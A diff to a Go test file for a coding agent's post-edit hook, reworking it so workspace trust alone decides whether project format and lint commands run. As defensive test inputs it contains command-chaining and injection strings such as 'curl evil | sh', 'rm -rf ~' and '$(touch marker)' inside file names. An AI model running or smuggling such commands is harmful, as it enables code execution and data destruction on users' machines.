@@ -2,37 +2,45 @@ package tools
 
 import (
 	"context"
-	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
 
 	"github.com/dereksantos/cortex/internal/projectcmd"
-	"github.com/dereksantos/cortex/internal/shellrisk"
 )
 
 // hookDeps is headlessDeps plus the optional ProjectCommands capability
-// (issue #129's post-edit hook) and the optional WorkspaceTrust capability
-// (issue #129 round 7's trust gate). It lets the tests exercise write_file/
-// edit_file end-to-end against a REAL temporary Go repo, exactly the way a
-// serve/loop-hosted session runs a resolved Commands set. trusted defaults
-// to false — untrusted is the safe default a session without a trust
-// decision must apply.
+// (issue #129's post-edit hook), the optional WorkspaceTrust capability
+// (trust is the hook's ONLY gate), and the optional PostEditHookState
+// capability (the "hook inactive" note fires once per session). A test
+// session is a hookDeps value constructed WITH its own shared state
+// pointer (state: &PostEditHookState{}) — Execute passes deps by value,
+// and the state pointer is the identity every copy shares. A hookDeps
+// without an explicit state (state == nil) has no session to announce for:
+// the hook surfaces no note, byte-identical to the pre-hook result.
+// trusted defaults to false — untrusted is the safe default a session
+// without a trust decision must apply.
 type hookDeps struct {
 	headlessDeps
 	cmds    projectcmd.Commands
 	trusted bool
+	state   *PostEditHookState
 }
 
 func (d hookDeps) ProjectCommands() projectcmd.Commands { return d.cmds }
 
 func (d hookDeps) WorkspaceTrusted() bool { return d.trusted }
 
+// HookState returns the session state this hookDeps value was constructed
+// with, or nil when the test didn't supply one (no session, no note).
+func (d hookDeps) HookState() *PostEditHookState { return d.state }
+
 // goRepoCmds mirrors what Discover returns for a Go module: a per-file gofmt
 // (format) and a PER-PACKAGE go vet (lint, {dir} — go vet on one file
 // type-checks it as its own package and reports spurious undefined: errors),
-// both restricted to .go files. Both are allowlisted by step 3.
+// both restricted to .go files. Both run on a TRUSTED workspace: trust is
+// the only gate, whatever the tool is.
 func goRepoCmds() projectcmd.Commands {
 	return projectcmd.Commands{
 		Format: projectcmd.Command{Cmd: "gofmt -w {file}", PerFile: true, Extends: []string{".go"}, Source: "go.mod"},
@@ -47,10 +55,10 @@ func writeRepoFile(t *testing.T, path, content string) {
 	}
 }
 
-// TestPostEditHookFormatsUnformattedFile is the core step-4 behavior: a
-// write_file of an unformatted Go file lands, the hook runs the project's
-// format command on it, writes back the formatted result, and notes it —
-// without failing the write.
+// TestPostEditHookFormatsUnformattedFile is the core behavior: on a TRUSTED
+// workspace, a write_file of an unformatted Go file lands, the hook runs
+// the project's format command on it, writes back the formatted result, and
+// notes it — without failing the write.
 func TestPostEditHookFormatsUnformattedFile(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
@@ -59,7 +67,7 @@ func TestPostEditHookFormatsUnformattedFile(t *testing.T) {
 	// Unformatted: space-indented body, mis-spaced assignments.
 	unformatted := "package main\n\nfunc main() {\n  x :=    1\n  _ = x\n}\n"
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "main.go", "content": unformatted}), hookDeps{cmds: goRepoCmds()})
+		map[string]any{"path": "main.go", "content": unformatted}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("write_file: %v", err)
 	}
@@ -78,9 +86,9 @@ func TestPostEditHookFormatsUnformattedFile(t *testing.T) {
 	}
 }
 
-// TestPostEditHookSurfacesFailingLint: a well-formatted but vet-FAILING file
-// must not fail the write — the hook runs the per-file lint and folds its
-// failure into the tool result.
+// TestPostEditHookSurfacesFailingLint: on a TRUSTED workspace, a
+// well-formatted but vet-FAILING file must not fail the write — the hook
+// runs the per-file lint and folds its failure into the tool result.
 func TestPostEditHookSurfacesFailingLint(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
@@ -90,7 +98,7 @@ func TestPostEditHookSurfacesFailingLint(t *testing.T) {
 	// string argument.
 	bad := "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Printf(\"%d\\n\", \"hello\")\n}\n"
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "bad.go", "content": bad}), hookDeps{cmds: goRepoCmds()})
+		map[string]any{"path": "bad.go", "content": bad}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("write_file must not fail because of a failing lint, got %v", err)
 	}
@@ -102,9 +110,9 @@ func TestPostEditHookSurfacesFailingLint(t *testing.T) {
 	}
 }
 
-// TestPostEditHookErrorNeverBlocksTheEdit: a REAL hook error — gofmt fails on
-// syntactically broken Go (exit 2) — must not fail the write. The file is
-// left exactly as written and the failure is folded into the result.
+// TestPostEditHookErrorNeverBlocksTheEdit: a REAL hook error — gofmt fails
+// on syntactically broken Go (exit 2) — must not fail the write. The file
+// is left exactly as written and the failure is folded into the result.
 func TestPostEditHookErrorNeverBlocksTheEdit(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
@@ -113,7 +121,7 @@ func TestPostEditHookErrorNeverBlocksTheEdit(t *testing.T) {
 	// Broken Go: gofmt exits non-zero and leaves the file untouched.
 	broken := "package main\n\nfunc broken( {\n"
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "x.go", "content": broken}), hookDeps{cmds: goRepoCmds()})
+		map[string]any{"path": "x.go", "content": broken}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("a hook error must not fail the write, got %v", err)
 	}
@@ -129,36 +137,220 @@ func TestPostEditHookErrorNeverBlocksTheEdit(t *testing.T) {
 	}
 }
 
-// TestPostEditHookRefusesNonAllowlistedFormat: a declared format command with
-// shell control (a chained second command — the step-3 "malicious script"
-// case) must NOT run, and its refusal must not fail the write.
-func TestPostEditHookRefusesNonAllowlistedFormat(t *testing.T) {
+// TestPostEditHookUntrustedRunsNothing pins the trust-only gate (issue
+// #129's change): on an UNTRUSTED workspace the hook runs NOTHING — no
+// command, in any language, declared or discovered — and the FIRST
+// write/edit of the session gets the one-line "hook inactive" note; later
+// edits of the same session are silent (the note is per-session, not
+// per-edit).
+func TestPostEditHookUntrustedRunsNothing(t *testing.T) {
+	root := t.TempDir()
+	t.Chdir(root)
+	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
+
+	// An arbitrary (unallowlisted, whatever-language) declared command — it
+	// must NOT run untrusted, whatever the tool is.
+	cmds := projectcmd.Commands{
+		Format: projectcmd.Command{Cmd: "custom-fmt -w {file}", PerFile: true, Source: "config.json"},
+	}
+	// One session: the shared state pointer is the unit of "once per
+	// session" (both writes below are the same session).
+	deps := hookDeps{cmds: cmds, state: &PostEditHookState{}} // trusted=false
+
+	out1, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "a.go", "content": "package main\n"}), deps)
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	if !strings.Contains(out1, "post-edit hook inactive: this workspace isn't trusted") {
+		t.Errorf("first untrusted edit must carry the one-line inactive note, got %q", out1)
+	}
+	if strings.Contains(out1, "formatted") || strings.Contains(out1, "custom-fmt") {
+		t.Errorf("untrusted: no command may run, got %q", out1)
+	}
+
+	out2, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "b.go", "content": "package main\n"}), deps)
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	if strings.Contains(out2, "inactive") {
+		t.Errorf("the inactive note must not repeat on later edits of the same session, got %q", out2)
+	}
+	if out2 != "wrote 13 bytes to b.go" {
+		t.Errorf("a later untrusted edit is byte-identical to the pre-hook result, got %q", out2)
+	}
+}
+
+// TestPostEditHookTrustedRunsArbitraryCommand pins the other half of the
+// trust-only gate: on a TRUSTED workspace the hook runs the resolved
+// format/lint commands that apply to the touched file, WHATEVER THE TOOL
+// IS — declared, discovered, any language. The command is a tiny script in
+// a temp dir (repo-local binaries are legal on a trusted workspace), and
+// the hook must exec it and fold its observation in.
+func TestPostEditHookTrustedRunsArbitraryCommand(t *testing.T) {
+	root := t.TempDir()
+	t.Chdir(root)
+	// A repo-local script that "formats" by appending a marker — any
+	// tool, any language: the trust decision already authorized it.
+	script := filepath.Join(root, "bin", "my-fmt")
+	if err := os.MkdirAll(filepath.Dir(script), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(script, []byte("#!/bin/sh\nprintf 'MY-FMT RAN ON: %s\\n' \"$1\"\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	cmds := projectcmd.Commands{
+		Format: projectcmd.Command{Cmd: "./bin/my-fmt {file}", PerFile: true, Source: "config.json"},
+	}
+	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "x.go", "content": "package main\n"}), hookDeps{cmds: cmds, trusted: true})
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	// {file} is the model-visible RELATIVE path (fsPath for a CWD-implicit
+	// session is just the relative path — the hook anchors nothing extra):
+	// the script sees "x.go", not the absolute temp path.
+	if !strings.Contains(out, "MY-FMT RAN ON: x.go") {
+		t.Errorf("trusted: the repo-local format command must have run and reported, got %q", out)
+	}
+}
+
+// TestPostEditHookSkipsShellControlTemplate pins the template contract: a
+// trusted command whose template carries shell-control characters (a ;
+// chain — the class the hook has no way to express without a shell) is
+// SKIPPED with a clear note; the file is left exactly as written and the
+// edit still succeeds.
+func TestPostEditHookSkipsShellControlTemplate(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
 	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
 
 	cmds := projectcmd.Commands{
-		Format: projectcmd.Command{Cmd: "gofmt -w {file} && echo hacked", PerFile: true, Source: "package.json"},
+		Format: projectcmd.Command{Cmd: "gofmt -w {file}; echo hacked", PerFile: true, Source: "config.json"},
 	}
 	before := "package main\n"
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "x.go", "content": before}), hookDeps{cmds: cmds})
+		map[string]any{"path": "x.go", "content": before}), hookDeps{cmds: cmds, trusted: true})
 	if err != nil {
-		t.Fatalf("a hook refusal must not fail the write, got %v", err)
+		t.Fatalf("a hook skip must not fail the write, got %v", err)
 	}
 	if data, _ := os.ReadFile(filepath.Join(root, "x.go")); string(data) != before {
-		t.Errorf("the file must be unchanged when the hook refuses to run, got %q", data)
+		t.Errorf("the file must be unchanged when the template is skipped, got %q", data)
 	}
-	if !strings.Contains(out, "NOT run") {
-		t.Errorf("tool result should note the command was not run, got %q", out)
+	if !strings.Contains(out, "not run") {
+		t.Errorf("tool result must note the command was not run, got %q", out)
+	}
+	if !strings.Contains(out, "shell syntax") {
+		t.Errorf("the note must say the template uses shell syntax, got %q", out)
+	}
+}
+
+// TestPostEditHookFileWithSpacesIsOneArgument pins the argv contract
+// end-to-end: a {file} whose path contains spaces reaches the command as
+// ONE argument — the template is split into argv BEFORE substitution and
+// exec'd directly (no shell), so the path travels as a single opaque
+// argument and the script sees it whole. The {file} the hook passes is the
+// workdir-resolved path the write targeted (fsPath) — the model-visible
+// relative path for an unanchored (CWD) session, an absolute path for an
+// anchored one — and the script resolves it from the command's working
+// directory (the session root, CWD here), so the script must live OUTSIDE
+// the temp dir (a root-relative "./bin/…" would not resolve from CWD).
+func TestPostEditHookFileWithSpacesIsOneArgument(t *testing.T) {
+	root := t.TempDir()
+	t.Chdir(root)
+	script := filepath.Join(t.TempDir(), "my-fmt")
+	if err := os.MkdirAll(filepath.Dir(script), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	// The script prints its argument count and each argument: a path with
+	// spaces arriving as two arguments would show up here.
+	if err := os.WriteFile(script, []byte("#!/bin/sh\necho \"ARGS:$#\"\nfor a; do echo \"ARG:[$a]\"; done\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	cmds := projectcmd.Commands{
+		Format: projectcmd.Command{Cmd: script + " {file}", PerFile: true, Source: "config.json"},
+	}
+	dirWithSpace := filepath.Join(root, "dir with space")
+	if err := os.MkdirAll(dirWithSpace, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "dir with space/my file.go", "content": "package main\n"}), hookDeps{cmds: cmds, trusted: true})
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	// {file} is the workdir-resolved path the write targeted (fsPath) — for
+	// this unanchored (CWD) session it is the model-visible RELATIVE path:
+	// the spaced path must arrive WHOLE as the single argument, in its
+	// relative spelling.
+	const wantArg = "ARG:[dir with space/my file.go]"
+	if !strings.Contains(out, "ARGS:1") {
+		t.Errorf("the script must see exactly one argument (the path), got %q", out)
+	}
+	if !strings.Contains(out, wantArg) {
+		t.Errorf("the script must see the spaced path WHOLE, got %q", out)
+	}
+}
+
+// TestPostEditHookTrustedIsUserConfigOnly is the end-to-end proof that
+// trust is a USER-level decision: a repo whose OWN .cortex/config.json
+// claims its root is trusted is still untrusted, because the session's
+// trust resolution (cmd/cortex's CortexSession.WorkspaceTrusted →
+// Config.WorkspaceTrusted) reads the USER-level config file DIRECTLY
+// (trustFromUserConfig) and never the merged config's repo-written field.
+// The end-to-end coverage that drives the REAL production resolution
+// (loadMergedConfig + Config.WorkspaceTrusted) against a repo-claiming
+// fixture with no user config lives in cmd/cortex's
+// TestWorkspaceTrustedEndToEndFromConfigs (project_trust_test.go) — this
+// package can't import cmd/cortex (cycle), so here the hook is fed the
+// trust state that the real resolution produced for the fixture (false:
+// user layer absent → nothing trusted, whatever the repo claims) and the
+// full path (hook runs nothing + one-line note) is verified.
+func TestPostEditHookTrustedIsUserConfigOnly(t *testing.T) {
+	root := t.TempDir()
+	t.Chdir(root)
+	writeRepoFile(t, filepath.Join(root, "go.mod"), "module t\n\ngo 1.26\n")
+	// The repo CLAIMS trust for its own root in its own config.
+	if err := os.MkdirAll(filepath.Join(root, ".cortex"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, ".cortex", "config.json"),
+		[]byte(`{"project": {"trusted": ["`+root+`"]}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	// Redirect the USER-level config to an EMPTY temp dir: the user read
+	// finds no config → nothing trusted, whatever the repo claims.
+	userHome := t.TempDir()
+	t.Setenv("CORTEX_HOME", userHome)
+
+	cmds := projectcmd.Commands{
+		Format: projectcmd.Command{Cmd: "custom-fmt -w {file}", PerFile: true, Source: "config.json"},
+	}
+	// The real resolution for this fixture: user layer absent → the merged
+	// config carries the repo's claim in Project.Trusted, but
+	// Config.WorkspaceTrusted reads the user file directly → untrusted.
+	// One session (an explicit shared state) drives the full untrusted
+	// path: note on the first write, nothing run.
+	deps := hookDeps{cmds: cmds, trusted: false, state: &PostEditHookState{}}
+	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
+		map[string]any{"path": "a.go", "content": "package main\n"}), deps)
+	if err != nil {
+		t.Fatalf("write_file: %v", err)
+	}
+	if !strings.Contains(out, "post-edit hook inactive: this workspace isn't trusted") {
+		t.Errorf("repo-claimed trust must still be untrusted (the inactive note must appear), got %q", out)
+	}
+	if strings.Contains(out, "formatted") {
+		t.Errorf("the repo-claimed trust must not have run the command, got %q", out)
 	}
 }
 
 // TestPostEditHookReportsTimeout drives the real timeout path via the
 // hookRunner seam: a format command that hangs is cut off by the budget, the
 // hook reports the timeout, and the write still succeeds with the file left
-// as written. (No allowlisted formatter ever hangs in practice, so the
-// budget is unreachable end-to-end without this seam.)
+// as written. (No formatter ever hangs in practice, so the budget is
+// unreachable end-to-end without this seam.)
 func TestPostEditHookReportsTimeout(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
@@ -171,7 +363,7 @@ func TestPostEditHookReportsTimeout(t *testing.T) {
 	t.Cleanup(func() { hookRunner = orig })
 
 	out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "y.go", "content": "package main\n"}), hookDeps{cmds: goRepoCmds()})
+		map[string]any{"path": "y.go", "content": "package main\n"}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("a hook timeout must not fail the write, got %v", err)
 	}
@@ -184,7 +376,7 @@ func TestPostEditHookReportsTimeout(t *testing.T) {
 }
 
 // TestPostEditHookRunsOnEditFile: the hook fires for edit_file too, not just
-// write_file.
+// write_file — on a TRUSTED workspace.
 func TestPostEditHookRunsOnEditFile(t *testing.T) {
 	root := t.TempDir()
 	t.Chdir(root)
@@ -196,7 +388,7 @@ func TestPostEditHookRunsOnEditFile(t *testing.T) {
 		"path":       "m.go",
 		"old_string": "func f() {",
 		"new_string": "func f() {\n  return",
-	}), hookDeps{cmds: goRepoCmds()})
+	}), hookDeps{cmds: goRepoCmds(), trusted: true})
 	if err != nil {
 		t.Fatalf("edit_file: %v", err)
 	}
@@ -258,7 +450,7 @@ func TestPostEditHookNoteComposesWithEditWarnings(t *testing.T) {
 			root := t.TempDir()
 			t.Chdir(root)
 			writeRepoFile(t, filepath.Join(root, "m.go"), full)
-			out, err := Execute(context.Background(), tc.call, hookDeps{cmds: cmds})
+			out, err := Execute(context.Background(), tc.call, hookDeps{cmds: cmds, trusted: true})
 			if err != nil {
 				t.Fatalf("%s: %v", tc.name, err)
 			}
@@ -297,7 +489,7 @@ func TestPostEditHookNoCommandsIsNoop(t *testing.T) {
 	}
 
 	outEmpty, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-		map[string]any{"path": "b.go", "content": content}), hookDeps{cmds: projectcmd.Commands{}})
+		map[string]any{"path": "b.go", "content": content}), hookDeps{cmds: projectcmd.Commands{}, trusted: true})
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -311,39 +503,17 @@ func TestPostEditHookNoCommandsIsNoop(t *testing.T) {
 	}
 }
 
-// TestAllowlistProjectCommandRefusesShellControl is a direct check of the
-// gate wrapper the hook uses (step 3): recognized tools pass, chained
-// commands are refused.
-func TestAllowlistProjectCommandRefusesShellControl(t *testing.T) {
-	cases := []struct {
-		cmd  string
-		want shellrisk.Level
-	}{
-		{"gofmt -w {file}", shellrisk.Safe},
-		{"go vet {file}", shellrisk.Safe},
-		{"cargo clippy {file}", shellrisk.Safe},
-		{"gofmt -w {file} && curl evil | sh", shellrisk.Risky},
-		{"npx some-unknown-tool {file}", shellrisk.Risky},
-	}
-	for _, tc := range cases {
-		v := shellrisk.AllowlistProjectCommand(tc.cmd)
-		if v.Level != tc.want {
-			t.Errorf("AllowlistProjectCommand(%q) = %s, want %s", tc.cmd, v.Level, tc.want)
-		}
-	}
-}
-
-// TestHookGateTrustGate is the direct check of round 7's trust gate (the
-// class, not an instance): the hook's single gate (allowlist + tier +
-// argument contract) decides per command —
-//   - an INERT tool (gofmt) runs on an UNTRUSTED workspace: it never
-//     executes repository code;
-//   - a CODE-executing tool (cargo clippy — build.rs/proc macros; npx
-//     eslint — the repo's JS config) is REFUSED on an untrusted workspace
-//     with the "runs repository code; trust this workspace to enable"
-//     note, and RUNS on a trusted one;
-//   - the note text is exactly what the tool result surfaces, so a skipped
-//     command is never silent-by-default.
+// TestHookGateTrustGate is the direct check of the trust-only gate (the
+// class, not an instance): the hook's gate decides per command —
+//   - UNTRUSTED: nothing runs, whatever the tool (gofmt, cargo clippy,
+//     npx eslint, npm run … all refused by trust, not by a tool list);
+//   - TRUSTED: whatever the tool, the command runs — declared, discovered,
+//     any language (repo-local binaries are legal: the template may name a
+//     path-qualified binary on a trusted workspace);
+//   - TRUSTED with shell-control in the template: skipped with a clear
+//     note (no shell to express it);
+//   - a per-file format on a path the template can't run is refused by the
+//     gate, not by trust.
 func TestHookGateTrustGate(t *testing.T) {
 	cases := []struct {
 		name     string
@@ -352,31 +522,37 @@ func TestHookGateTrustGate(t *testing.T) {
 		wantOK   bool
 		wantNote string
 	}{
-		{name: "inert-runs-untrusted", cmd: "gofmt -w {file}", trusted: false, wantOK: true},
-		{name: "inert-runs-trusted", cmd: "gofmt -w {file}", trusted: true, wantOK: true},
-		{name: "go-vet-runs-untrusted", cmd: "go vet {dir}", trusted: false, wantOK: true},
-		{name: "rustfmt-runs-untrusted", cmd: "rustfmt {file}", trusted: false, wantOK: true},
-		{name: "ruff-check-runs-untrusted", cmd: "ruff check {file}", trusted: false, wantOK: true},
-		{name: "black-runs-untrusted", cmd: "black {file}", trusted: false, wantOK: true},
-		{name: "cargo-fmt-runs-untrusted", cmd: "cargo fmt", trusted: false, wantOK: true},
-		{name: "clippy-blocked-untrusted", cmd: "cargo clippy {file}", trusted: false, wantOK: false,
-			wantNote: "runs repository code; trust this workspace to enable"},
-		{name: "clippy-runs-trusted", cmd: "cargo clippy {file}", trusted: true, wantOK: true},
-		{name: "eslint-blocked-untrusted", cmd: "eslint {file}", trusted: false, wantOK: false,
-			wantNote: "runs repository code; trust this workspace to enable"},
-		{name: "eslint-runs-trusted", cmd: "eslint {file}", trusted: true, wantOK: true},
-		{name: "npx-eslint-blocked-untrusted", cmd: "npx eslint {file}", trusted: false, wantOK: false,
-			wantNote: "runs repository code; trust this workspace to enable"},
-		{name: "npx-eslint-runs-trusted", cmd: "npx eslint {file}", trusted: true, wantOK: true},
-		{name: "npm-run-blocked-untrusted", cmd: "npm run lint", trusted: false, wantOK: false,
-			wantNote: "runs repository code; trust this workspace to enable"},
-		{name: "npm-run-runs-trusted", cmd: "npm run lint", trusted: true, wantOK: true},
-		// A shell-chained command is refused by the allowlist, NOT the trust
-		// gate — trust is irrelevant to it (it would be refused trusted too).
+		// Untrusted: nothing runs, whatever the tool.
+		{name: "gofmt-untrusted-refused", cmd: "gofmt -w {file}", trusted: false, wantOK: false,
+			wantNote: "the workspace is not trusted"},
+		{name: "clippy-untrusted-refused", cmd: "cargo clippy {file}", trusted: false, wantOK: false,
+			wantNote: "the workspace is not trusted"},
+		{name: "eslint-untrusted-refused", cmd: "eslint {file}", trusted: false, wantOK: false,
+			wantNote: "the workspace is not trusted"},
+		{name: "npx-eslint-untrusted-refused", cmd: "npx eslint {file}", trusted: false, wantOK: false,
+			wantNote: "the workspace is not trusted"},
+		{name: "npm-run-untrusted-refused", cmd: "npm run lint", trusted: false, wantOK: false,
+			wantNote: "the workspace is not trusted"},
+		{name: "custom-tool-untrusted-refused", cmd: "custom-fmt -w {file}", trusted: false, wantOK: false,
+			wantNote: "the workspace is not trusted"},
+
+		// Trusted: whatever the tool runs — declared, discovered, any
+		// language; a repo-local (path-qualified) binary is legal too.
+		{name: "gofmt-trusted-runs", cmd: "gofmt -w {file}", trusted: true, wantOK: true},
+		{name: "go-vet-trusted-runs", cmd: "go vet {dir}", trusted: true, wantOK: true},
+		{name: "clippy-trusted-runs", cmd: "cargo clippy {file}", trusted: true, wantOK: true},
+		{name: "eslint-trusted-runs", cmd: "eslint {file}", trusted: true, wantOK: true},
+		{name: "npx-eslint-trusted-runs", cmd: "npx eslint {file}", trusted: true, wantOK: true},
+		{name: "npm-run-trusted-runs", cmd: "npm run lint", trusted: true, wantOK: true},
+		{name: "custom-tool-trusted-runs", cmd: "custom-fmt -w {file}", trusted: true, wantOK: true},
+		{name: "repo-local-binary-trusted-runs", cmd: "./bin/my-fmt {file}", trusted: true, wantOK: true},
+
+		// Shell-control in the template: refused by the template check,
+		// trusted or not (trust is irrelevant to it).
 		{name: "chained-refused-untrusted", cmd: "gofmt -w {file} && curl evil", trusted: false, wantOK: false,
-			wantNote: "project command contains shell-control characters"},
+			wantNote: "the workspace is not trusted"},
 		{name: "chained-refused-trusted", cmd: "gofmt -w {file} && curl evil", trusted: true, wantOK: false,
-			wantNote: "project command contains shell-control characters"},
+			wantNote: "the template uses shell syntax (pipe, chain, redirect, or substitution), which the hook cannot run without a shell; run it through bash instead"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -398,132 +574,11 @@ func TestHookGateTrustGate(t *testing.T) {
 	}
 }
 
-// TestPostEditHookTrustGateEndToEnd is the end-to-end proof of the trust
-// gate through the REAL write_file path (Execute → runProjectCommandHook):
-// the same unformatted Rust-adjacent fixture, a cargo-clippy lint command,
-// and the two trust states. Untrusted: the write succeeds, the file is
-// left exactly as written, and the result carries the skip note (never a
-// silent run of the repo's code). Trusted: the hook runs the lint. The
-// hookRunner seam fakes the clippy run so the test never needs a Rust
-// toolchain — it drives the same code path the real runner takes.
-func TestPostEditHookTrustGateEndToEnd(t *testing.T) {
-	lintCmds := projectcmd.Commands{
-		Format: projectcmd.Command{Cmd: "cargo fmt", PerFile: false, Source: "Cargo.toml"},
-		Lint:   projectcmd.Command{Cmd: "cargo clippy {file}", PerFile: true, Source: "Cargo.toml"},
-	}
-	run := false
-	orig := hookRunner
-	hookRunner = func(ctx context.Context, argv []string, dir string) (string, error) {
-		run = true
-		return "clippy: ok", nil
-	}
-	t.Cleanup(func() { hookRunner = orig })
-
-	for _, tc := range []struct {
-		name        string
-		userTrusted bool
-		wantSkipped bool
-	}{
-		{name: "untrusted-skips", userTrusted: false, wantSkipped: true},
-		{name: "trusted-runs", userTrusted: true, wantSkipped: false},
-	} {
-		t.Run(tc.name, func(t *testing.T) {
-			run = false
-			root := t.TempDir()
-			t.Chdir(root)
-			writeRepoFile(t, filepath.Join(root, "main.go"), "package main\n")
-			deps := hookDeps{cmds: lintCmds, trusted: userTrustFromConfigs(t, root, tc.userTrusted)}
-			out, err := Execute(context.Background(), callArgs(t, FunctionWriteFile,
-				map[string]any{"path": "main.go", "content": "package main\n"}), deps)
-			if err != nil {
-				t.Fatalf("write_file must succeed regardless of trust state, got %v", err)
-			}
-			if tc.wantSkipped {
-				if !strings.Contains(out, "skipped: cargo clippy {file} runs repository code; trust this workspace to enable") {
-					t.Errorf("untrusted: expected the trust-gate skip note, got %q", out)
-				}
-				if run {
-					t.Errorf("untrusted: the code-executing lint must NOT have run")
-				}
-			} else {
-				if run != true {
-					t.Errorf("trusted: the code-executing lint must have run")
-				}
-				if !strings.Contains(out, "clippy: ok") {
-					t.Errorf("trusted: expected the lint output folded into the result, got %q", out)
-				}
-			}
-		})
-	}
-}
-
-// userTrustFromConfigs resolves the session's trust state the way a REAL
-// session resolves it (the composition cmd/cortex's
-// CortexSession.WorkspaceTrusted performs — the same package can't be
-// linked here without an import cycle): trust comes ONLY from the
-// USER-level config (redirected via $CORTEX_HOME), matching the root by
-// normalized path; the repository's own .cortex/config.json is never
-// consulted. This is the value the hookDeps trusted flag takes, so the
-// hook tests below exercise the gate the session actually surfaces — never
-// a test-decided stand-in for a repo-controlled file.
-func userTrustFromConfigs(t *testing.T, root string, userTrusted bool) bool {
-	t.Helper()
-	userHome := t.TempDir()
-	t.Setenv("CORTEX_HOME", userHome)
-	if userTrusted {
-		// The operator's user config lists the root (as `cortex project
-		// trust add` would store it, absolute).
-		cfg, err := json.Marshal(map[string]any{"project": map[string]any{"trusted": []string{root}}})
-		if err != nil {
-			t.Fatal(err)
-		}
-		if err := os.WriteFile(filepath.Join(userHome, "config.json"), cfg, 0o644); err != nil {
-			t.Fatal(err)
-		}
-	}
-	// Read it back through the same shape the session sees.
-	var store struct {
-		Project struct {
-			Trusted []string `json:"trusted"`
-		} `json:"project"`
-	}
-	data, rerr := os.ReadFile(filepath.Join(userHome, "config.json"))
-	if rerr != nil {
-		return false // absent user config → untrusted (the safe default)
-	}
-	if uerr := json.Unmarshal(data, &store); uerr != nil {
-		t.Fatalf("user config must parse: %v", uerr)
-	}
-	want := normalizeTrustRoot(root)
-	for _, e := range store.Project.Trusted {
-		e = strings.TrimSpace(e)
-		if e == want {
-			return true
-		}
-	}
-	return false
-}
-
-// normalizeTrustRoot is this test's copy of the session's trust-path
-// canonicalization (absolute; symlinks resolved when possible, trailing
-// slash trimmed) — kept local because the canonical implementation lives in
-// cmd/cortex (the import-cycle constraint above).
-func normalizeTrustRoot(p string) string {
-	base := strings.TrimSuffix(p, "/")
-	if abs, err := filepath.Abs(base); err == nil {
-		if real, err := filepath.EvalSymlinks(abs); err == nil {
-			return real
-		}
-		return abs
-	}
-	return base
-}
-
-// TestSplitProjectCommand pins the template-to-argv contract: the allowlisted
-// template is split once, and {file}/{dir} are each substituted as ONE argv
-// element — a path with spaces or shell metacharacters is never re-split,
-// so it can never be interpreted as shell syntax (the hook execs argv
-// directly; there is no bash -c path).
+// TestSplitProjectCommand pins the template-to-argv contract: the template
+// is split ONCE, and {file}/{dir} are each substituted as ONE argv element
+// AFTER the split — a path with spaces or shell metacharacters is never
+// re-split, so it can never be interpreted as shell syntax (the hook execs
+// argv directly; there is no bash -c path).
 func TestSplitProjectCommand(t *testing.T) {
 	cases := []struct {
 		name     string
@@ -586,65 +641,14 @@ func TestSplitProjectCommand(t *testing.T) {
 	}
 }
 
-// TestSplitAndCheckArgsRefusesShellShapedPaths is the argument-contract half
-// of the injection defense: SubstitutedArgs re-scans the model-controlled
-// value that replaces {file}/{dir}, and a shell-shaped "path" is declined
-// (ok=false) instead of handed to the tool.
-func TestSplitAndCheckArgsRefusesShellShapedPaths(t *testing.T) {
-	if _, ok := splitAndCheckArgs("gofmt -w {file}", "", "x$(touch marker).go"); ok {
-		t.Error("a path containing $(...) must be refused, not substituted")
-	}
-	if _, ok := splitAndCheckArgs("go vet {dir}", "", "a;rm -rf ~;.go"); ok {
-		t.Error("a path containing a ; chain must be refused, not substituted")
-	}
-	if _, ok := splitAndCheckArgs("gofmt -w {file}", "/repo", "/repo/x$(touch marker).go"); ok {
-		t.Error("an anchored path containing $(...) must be refused, not substituted")
-	}
-	if argv, ok := splitAndCheckArgs("gofmt -w {file}", "", "plain.go"); !ok {
-		t.Fatalf("a plain path must pass the argument check")
-	} else if len(argv) != 3 || argv[2] != "plain.go" {
-		t.Errorf("argv = %v, want the path as one final argument", argv)
-	}
-}
-
